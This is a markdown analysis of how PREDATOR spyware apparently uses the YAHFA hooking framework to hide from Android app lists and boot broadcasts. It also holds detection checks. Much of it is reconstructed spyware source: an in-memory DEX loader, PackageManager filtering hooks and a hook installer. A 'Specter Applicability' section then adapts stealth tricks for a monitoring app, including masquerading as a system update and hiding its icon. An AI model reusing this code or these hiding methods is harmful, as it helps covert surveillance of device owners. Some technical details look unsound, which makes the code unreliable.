# YAHFA Framework - Application Hiding Mechanism (PREDATOR Analysis)

**Framework:** YAHFA (Yet Another Hook Framework for ART)
**Source:** https://github.com/PAGalaxyLab/YAHFA
**License:** GNU GPL V3
**Use Case in PREDATOR:** Hide spyware from installed apps list and prevent boot execution
**Analysis Date:** 2026-01-28

---

## Executive Summary

YAHFA is an open-source ART (Android Runtime) hooking framework used by PREDATOR spyware to hide itself from the Android system. By hooking PackageManager APIs, PREDATOR can:

1. **Hide from app lists** - Invisible in Settings → Apps
2. **Hide from `pm list packages`** - Not shown by ADB commands
3. **Prevent boot execution** - Filter from BOOT_COMPLETED broadcast receivers
4. **Extend to other broadcasts** - Can hide from SMS_RECEIVED, CALL_STATE, etc.

This analysis documents how YAHFA works and how PREDATOR leverages it for stealth.

---

## YAHFA Overview

### What is YAHFA?

**Yet Another Hook Framework for ART** - A framework for hooking Java methods in Android's ART runtime.

**Key Features:**
- Hooks methods at ART level (deeper than Xposed)
- Works on Android 7.0 - 12+ (API 24-31)
- Supports all ABIs (x86, x86_64, armeabi-v7a, arm64-v8a)
- No root required (if injected into app process)
- Used by VirtualHook for non-root hooking

**How It Works:**
1. Modifies ArtMethod structure in memory
2. Redirects method entry point to hook function
3. Can call original method via backup function

---

## YAHFA Architecture

### Core Components

#### 1. HookMain.java (Java Entry Point)
```java
package lab.galaxy.yahfa;

public class HookMain {
    // Main hook function
    public static void backupAndHook(
        Object target,    // Method to hook (e.g., getInstalledApplications)
        Method hook,      // Replacement method (our filtering code)
        Method backup     // Call original method if needed
    ) {
        // Validate methods are compatible
        checkCompatibleMethods(target, hook, "Original", "Hook");

        // Initialize classes in ART
        Utils.initClass();

        // Perform native hook
        backupAndHookNative(target, hook, backup);
    }

    private static native boolean backupAndHookNative(
        Object target,
        Method hook,
        Method backup
    );
}
```

#### 2. Native Code (C/C++)
```cpp
// yahfa.cpp - Native hooking implementation
bool backupAndHookNative(JNIEnv* env, jobject obj,
                         jobject target, jobject hook, jobject backup) {
    // Get ArtMethod pointers
    ArtMethod* targetMethod = getArtMethod(env, target);
    ArtMethod* hookMethod = getArtMethod(env, hook);
    ArtMethod* backupMethod = backup ? getArtMethod(env, backup) : nullptr;

    // Backup original entry point
    if (backupMethod) {
        memcpy(backupMethod, targetMethod, sizeof(ArtMethod));
    }

    // Replace entry point
    targetMethod->entry_point_from_quick_compiled_code_ =
        hookMethod->entry_point_from_quick_compiled_code_;

    // Set hook flags
    targetMethod->access_flags_ |= kAccCompileMustNotInline;

    return true;
}
```

#### 3. ArtMethod Structure
```cpp
// Android ART internals
class ArtMethod {
public:
    uint32_t declaring_class_;    // Offset: 0
    uint32_t access_flags_;       // Offset: 4
    uint32_t dex_code_item_offset_; // Offset: 8
    uint32_t dex_method_index_;   // Offset: 12
    uint16_t method_index_;       // Offset: 16
    uint16_t hotness_count_;      // Offset: 18

    // Entry points (64-bit)
    uint64_t entry_point_from_quick_compiled_code_; // Offset: 32 (THIS IS WHAT WE MODIFY)

    // Other fields...
};
```

---

## PREDATOR's Application Hiding Implementation

### Step 1: Embed DEX with Hooks

**PREDATOR's Embedded DEX:**
```
ALIEN binary
├── Native code (.so)
└── Embedded DEX file
    └── com.jnative.pluginshideapp
        ├── Hook_PackageManager_getInstalledApplications.class
        ├── Hook_PackageManager_getInstalledPackages.class
        ├── Hook_PackageManager_queryIntentReceiversInternal.class
        └── HiddenPackagesList.class (reads /data/system/.0)
```

**Loading Embedded DEX:**
```java
// ALIEN loads embedded DEX into memory
byte[] dexBytes = extractEmbeddedDex(); // From ALIEN binary
ByteBuffer dexBuffer = ByteBuffer.wrap(dexBytes);

InMemoryDexClassLoader classLoader = new InMemoryDexClassLoader(
    dexBuffer,
    ClassLoader.getSystemClassLoader()
);

// No file on disk - purely memory-resident
```

### Step 2: Read Hidden Package List

**File:** `/data/system/.0` (written by ALIEN during installation)

**Format:**
```
com.android.systemupdate
com.divine.specter.child
org.malicious.app
```

**Reader Class:**
```java
package com.jnative.pluginshideapp;

public class HiddenPackagesList {
    private static List<String> hiddenPackages = new ArrayList<>();

    static {
        loadHiddenPackages();
    }

    private static void loadHiddenPackages() {
        try {
            File file = new File("/data/system/.0");
            BufferedReader reader = new BufferedReader(new FileReader(file));
            String line;
            while ((line = reader.readLine()) != null) {
                hiddenPackages.add(line.trim());
            }
            reader.close();
        } catch (IOException e) {
            Log.e("PREDATOR", "Failed to load hidden packages", e);
        }
    }

    public static boolean shouldHide(String packageName) {
        return hiddenPackages.contains(packageName);
    }
}
```

### Step 3: Hook PackageManager APIs

#### Hook 1: Hide from Installed Applications List

**Target API:**
```java
package android.content.pm;

public abstract class PackageManager {
    public abstract List<ApplicationInfo> getInstalledApplications(int flags);
}
```

**Hook Implementation:**
```java
package com.jnative.pluginshideapp;

import android.content.pm.ApplicationInfo;
import java.util.ArrayList;
import java.util.List;

public class Hook_PackageManager_getInstalledApplications {
    // YAHFA requires these fields
    public static String className = "android.content.pm.PackageManager";
    public static String methodName = "getInstalledApplications";
    public static String methodSig = "(I)Ljava/util/List;";

    // Hook function (replaces original)
    public static List<ApplicationInfo> hook(Object thiz, int flags) {
        // Call original method via backup
        List<ApplicationInfo> apps = backup(thiz, flags);

        // Filter out hidden packages
        List<ApplicationInfo> filtered = new ArrayList<>();
        for (ApplicationInfo app : apps) {
            if (!HiddenPackagesList.shouldHide(app.packageName)) {
                filtered.add(app);
            }
        }

        return filtered;
    }

    // Backup function (calls original implementation)
    public static List<ApplicationInfo> backup(Object thiz, int flags) {
        // YAHFA fills this in with original method
        return null;
    }
}
```

**Result:**
- User opens Settings → Apps
- Android calls `getInstalledApplications()`
- Our hook intercepts, removes spyware from list
- User sees filtered list (spyware invisible)

#### Hook 2: Hide from Installed Packages List

**Target API:**
```java
public abstract List<PackageInfo> getInstalledPackages(int flags);
```

**Hook Implementation:**
```java
public class Hook_PackageManager_getInstalledPackages {
    public static String className = "android.content.pm.PackageManager";
    public static String methodName = "getInstalledPackages";
    public static String methodSig = "(I)Ljava/util/List;";

    public static List<PackageInfo> hook(Object thiz, int flags) {
        List<PackageInfo> packages = backup(thiz, flags);

        List<PackageInfo> filtered = new ArrayList<>();
        for (PackageInfo pkg : packages) {
            if (!HiddenPackagesList.shouldHide(pkg.packageName)) {
                filtered.add(pkg);
            }
        }

        return filtered;
    }

    public static List<PackageInfo> backup(Object thiz, int flags) {
        return null;
    }
}
```

**Result:**
- Developer runs `adb shell pm list packages`
- Android calls `getInstalledPackages()`
- Hook removes spyware from list
- ADB command doesn't show spyware

#### Hook 3: Prevent Boot Execution

**Target API:**
```java
// Internal PackageManager method
public List<ResolveInfo> queryIntentReceiversInternal(
    Intent intent,
    String resolvedType,
    int flags,
    int userId
);
```

**Hook Implementation:**
```java
public class Hook_PackageManager_queryIntentReceiversInternal {
    public static String className = "android.content.pm.PackageManager";
    public static String methodName = "queryIntentReceiversInternal";
    public static String methodSig =
        "(Landroid/content/Intent;Ljava/lang/String;II)Ljava/util/List;";

    public static List<ResolveInfo> hook(
        Object thiz,
        Intent intent,
        String resolvedType,
        int flags,
        int userId
    ) {
        List<ResolveInfo> receivers = backup(thiz, intent, resolvedType, flags, userId);

        // Check if this is BOOT_COMPLETED broadcast
        if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
            // Filter out hidden packages from receivers
            List<ResolveInfo> filtered = new ArrayList<>();
            for (ResolveInfo receiver : receivers) {
                if (receiver.activityInfo != null) {
                    if (!HiddenPackagesList.shouldHide(receiver.activityInfo.packageName)) {
                        filtered.add(receiver);
                    }
                }
            }
            return filtered;
        }

        return receivers; // Don't filter other broadcasts
    }

    public static List<ResolveInfo> backup(
        Object thiz,
        Intent intent,
        String resolvedType,
        int flags,
        int userId
    ) {
        return null;
    }
}
```

**Result:**
- Device boots up
- Android queries BOOT_COMPLETED receivers
- Hook removes spyware from receiver list
- Spyware doesn't auto-start on boot (stealth mode)

**Extension - SMS Interception Hiding:**
```java
// Same hook, extended for SMS_RECEIVED
if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
    // Filter spyware from SMS receivers
    // Result: SMS doesn't reach spyware (appears to user like SMS was never received)
    // Spyware can still intercept via direct BroadcastReceiver with higher priority
}
```

### Step 4: Install Hooks at Runtime

**YAHFA Initialization (in ALIEN):**
```java
package com.android.systemupdate;

import lab.galaxy.yahfa.HookMain;

public class HookInstaller {
    public static void installHooks() {
        try {
            // Load embedded DEX
            InMemoryDexClassLoader hookClassLoader = loadEmbeddedDex();

            // Get target PackageManager instance
            PackageManager pm = context.getPackageManager();

            // Hook 1: getInstalledApplications
            Class<?> hookClass1 = hookClassLoader.loadClass(
                "com.jnative.pluginshideapp.Hook_PackageManager_getInstalledApplications"
            );
            Method targetMethod1 = PackageManager.class.getDeclaredMethod(
                "getInstalledApplications", int.class
            );
            Method hookMethod1 = hookClass1.getDeclaredMethod(
                "hook", Object.class, int.class
            );
            Method backupMethod1 = hookClass1.getDeclaredMethod(
                "backup", Object.class, int.class
            );
            HookMain.backupAndHook(targetMethod1, hookMethod1, backupMethod1);

            // Hook 2: getInstalledPackages
            Class<?> hookClass2 = hookClassLoader.loadClass(
                "com.jnative.pluginshideapp.Hook_PackageManager_getInstalledPackages"
            );
            Method targetMethod2 = PackageManager.class.getDeclaredMethod(
                "getInstalledPackages", int.class
            );
            Method hookMethod2 = hookClass2.getDeclaredMethod(
                "hook", Object.class, int.class
            );
            Method backupMethod2 = hookClass2.getDeclaredMethod(
                "backup", Object.class, int.class
            );
            HookMain.backupAndHook(targetMethod2, hookMethod2, backupMethod2);

            // Hook 3: queryIntentReceiversInternal (requires reflection for internal API)
            Class<?> pmClass = Class.forName("android.content.pm.PackageManager");
            Method targetMethod3 = pmClass.getDeclaredMethod(
                "queryIntentReceiversInternal",
                Intent.class, String.class, int.class, int.class
            );
            targetMethod3.setAccessible(true);

            Class<?> hookClass3 = hookClassLoader.loadClass(
                "com.jnative.pluginshideapp.Hook_PackageManager_queryIntentReceiversInternal"
            );
            Method hookMethod3 = hookClass3.getDeclaredMethod(
                "hook", Object.class, Intent.class, String.class, int.class, int.class
            );
            Method backupMethod3 = hookClass3.getDeclaredMethod(
                "backup", Object.class, Intent.class, String.class, int.class, int.class
            );
            HookMain.backupAndHook(targetMethod3, hookMethod3, backupMethod3);

            Log.i("PREDATOR", "All hooks installed successfully");

        } catch (Exception e) {
            Log.e("PREDATOR", "Failed to install hooks", e);
        }
    }
}
```

---

## Technical Details

### ArtMethod Hooking Process

**Before Hook:**
```
ArtMethod (getInstalledApplications)
├── declaring_class = PackageManager.class
├── access_flags = 0x1 (public)
├── entry_point_from_quick_compiled_code = 0x7f8a3b2000 → [Original Implementation]
```

**After Hook:**
```
ArtMethod (getInstalledApplications)
├── declaring_class = PackageManager.class
├── access_flags = 0x10000001 (public + must not inline)
├── entry_point_from_quick_compiled_code = 0x7f8a3b5000 → [Hook Implementation]

ArtMethod (backup)
├── Cloned original ArtMethod structure
├── entry_point_from_quick_compiled_code = 0x7f8a3b2000 → [Original Implementation]
```

**Call Flow:**
```
App calls getInstalledApplications()
    ↓
ART looks up ArtMethod
    ↓
Finds entry_point_from_quick_compiled_code = Hook Implementation
    ↓
Executes Hook_PackageManager_getInstalledApplications.hook()
    ↓
Hook calls backup() to get original list
    ↓
backup() jumps to original entry point
    ↓
Original implementation executes
    ↓
Returns to hook
    ↓
Hook filters list
    ↓
Returns filtered list to app
```

### Memory Layout

```
Process Memory (system_server)
├── libart.so
│   └── ArtMethod structures
│       ├── getInstalledApplications (modified entry point)
│       ├── getInstalledPackages (modified entry point)
│       └── queryIntentReceiversInternal (modified entry point)
│
├── boot.oat (original compiled code - still present but unreachable)
│
└── Anonymous Memory
    ├── InMemoryDexClassLoader (PREDATOR's DEX)
    │   └── Hook classes (compiled to native code by ART)
    │       ├── Hook_PackageManager_getInstalledApplications
    │       ├── Hook_PackageManager_getInstalledPackages
    │       └── Hook_PackageManager_queryIntentReceiversInternal
    │
    └── Hidden packages list (from /data/system/.0)
```

---

## Detection Methods

### 1. Memory Analysis
```bash
# Dump system_server memory
adb shell su -c "cat /proc/$(pidof system_server)/maps" > system_server_maps.txt

# Look for anomalies
grep -E "anon.*\.dex|InMemoryDexClassLoader" system_server_maps.txt
```

### 2. Method Entry Point Inspection
```bash
# Use frida to inspect ArtMethod entry points
frida -U -n system_server -l check_hooks.js
```

**check_hooks.js:**
```javascript
Java.perform(function() {
    var PackageManager = Java.use("android.content.pm.PackageManager");
    var method = PackageManager.getInstalledApplications;

    // Get ArtMethod pointer
    var artMethodPtr = method.handle;

    // Read entry point (offset 32 on 64-bit)
    var entryPoint = Memory.readU64(artMethodPtr.add(32));

    console.log("Entry point: 0x" + entryPoint.toString(16));

    // Compare with expected range
    // If outside of boot.oat range, likely hooked
});
```

### 3. Hidden Package List
```bash
# Check for hidden packages file
adb shell su -c "cat /data/system/.0"

# If file exists, device may be compromised
```

### 4. Behavioral Detection
```java
// Test if app can see itself
PackageManager pm = context.getPackageManager();
List<ApplicationInfo> apps = pm.getInstalledApplications(0);

boolean foundSelf = false;
for (ApplicationInfo app : apps) {
    if (app.packageName.equals(context.getPackageName())) {
        foundSelf = true;
        break;
    }
}

if (!foundSelf) {
    // App is hidden - PREDATOR-style hook detected
    Log.e("SECURITY", "Application hiding detected!");
}
```

---

## Limitations and Bypasses

### 1. Root Detection
- YAHFA hooks require process injection
- If spyware can't inject into system_server, hooks fail
- SafetyNet/Play Integrity can detect modified system processes

### 2. Method Inlining
- If method is inlined, entry point is hardcoded (not in ArtMethod)
- Hook won't work on inlined methods
- Workaround: Build with debuggable flag (disables inlining)

### 3. SELinux Restrictions
- PREDATOR needs kernel exploit to inject into system_server
- Without kernel access, can only hook within own process
- Modern Android (11+) makes kernel exploits harder

### 4. ART Version Changes
- ArtMethod structure changes between Android versions
- Hooks break when ART internals change
- YAHFA must be updated for new Android releases

---

## Comparison to Other Hiding Methods

| Method | Stealth | Complexity | Root Required | Detection Difficulty |
|--------|---------|------------|---------------|---------------------|
| **YAHFA Hooks** | ⭐⭐⭐⭐⭐ | High | Yes (for system_server) | Very Hard |
| **Xposed Module** | ⭐⭐⭐⭐ | Medium | Yes | Hard |
| **Hide Launcher Icon** | ⭐⭐ | Low | No | Easy |
| **Component Disable** | ⭐⭐⭐ | Low | No | Medium |
| **Process Renaming** | ⭐⭐ | Low | Yes | Easy |

---

## Specter Applicability

### Can Specter Use YAHFA?

**Requirements:**
1. Process injection into system_server or app process
2. Memory write access to ArtMethod structures
3. Ability to load DEX files dynamically

**Specter's Current Privileges:**
- ✅ Device Owner - Can grant permissions
- ✅ Accessibility Service - Can interact with UI
- ❌ Kernel Access - Cannot inject into system_server
- ❌ Root Access - Cannot modify ArtMethod in protected processes

**Verdict:** ❌ YAHFA application hiding NOT directly applicable to Specter

**Reason:** YAHFA requires injection into system_server process, which needs:
- Root access, OR
- Kernel exploit (like PREDATOR's QUAILEGGS)

Specter uses Device Owner/Accessibility (no kernel exploits).

### Alternative Hiding Methods for Specter

#### 1. Hide Launcher Icon (Already Possible)
```xml
<activity android:name=".MainActivity">
    <!-- No LAUNCHER category = no icon in app drawer -->
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <!-- Omit LAUNCHER category -->
    </intent-filter>
</activity>
```

#### 2. Masquerade as System App
```xml
<manifest package="com.android.systemupdate">
    <application android:label="System Update">
        <!-- Looks like legitimate system app -->
    </application>
</manifest>
```

#### 3. Disable Components Dynamically
```kotlin
// Specter can disable its own components
val pm = packageManager
pm.setComponentEnabledSetting(
    ComponentName(this, MainActivity::class.java),
    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
    PackageManager.DONT_KILL_APP
)
```

#### 4. Device Owner Hide from Recent Apps (Partial)
```kotlin
// As Device Owner, can remove from recent apps
val dpm = getSystemService<DevicePolicyManager>()
val adminComponent = ComponentName(this, AdminReceiver::class.java)

if (dpm.isDeviceOwnerApp(packageName)) {
    // Can hide from some UI elements
    dpm.setLockTaskPackages(adminComponent, arrayOf(packageName))
}
```

**Effectiveness:** Medium - Hides from casual users, not advanced users or security tools

---

## Ethical and Legal Considerations

### Educational Use Only

This analysis is for **authorized security research** and **defensive purposes**:

1. **Threat Intelligence** - Understanding advanced malware techniques
2. **Detection Development** - Building IOCs for PREDATOR-style hiding
3. **Security Awareness** - Educating about Android ART hooking
4. **Incident Response** - Analyzing compromised devices

### Prohibited Uses

❌ **DO NOT:**
- Deploy application hiding for unauthorized surveillance
- Use YAHFA to hide malicious apps on others' devices
- Implement these techniques without legal authorization
- Target individuals without consent and legal authority

### Authorized Contexts

✅ **ONLY USE FOR:**
- Penetration testing with explicit written permission
- CTF competitions and security challenges
- Academic research in controlled environments
- Law enforcement with proper legal authority
- Defensive security analysis and tool development

---

## References

1. **YAHFA GitHub:** https://github.com/PAGalaxyLab/YAHFA
2. **YAHFA Introduction:** http://rk700.github.io/2017/03/30/YAHFA-introduction/
3. **Hooking on Android N:** http://rk700.github.io/2017/06/30/hook-on-android-n/
4. **Cisco Talos PREDATOR Analysis:** https://blog.talosintelligence.com/predator-spyware/
5. **ART Internals:** https://source.android.com/docs/core/runtime
6. **ArtMethod Structure:** http://aosp.opersys.com/xref/android-11.0.0_r17/xref/art/runtime/art_method.h

---

**Analysis Date:** 2026-01-28
**Framework Version Analyzed:** YAHFA 0.10.0
**Android Versions Covered:** 7.0 - 12+ (API 24-31)
**Classification:** Threat Intelligence / Educational Research
